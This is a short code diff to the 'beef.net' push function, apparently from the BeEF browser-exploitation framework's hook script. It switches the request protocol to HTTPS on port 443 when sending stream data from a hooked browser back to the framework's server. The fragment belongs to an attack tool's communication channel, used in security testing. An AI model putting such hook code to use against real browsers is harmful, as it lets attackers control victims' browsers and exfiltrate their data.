@@ -124,7 +124,7 @@ beef.net = {
     push: function(stream) {
         //need to implement wait feature here eventually
         for (var i = 0; i < stream.pc; i++) {
-            this.request('http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
+            this.request(this.port == '443' ? 'https' : 'http', 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
         }
     },
 
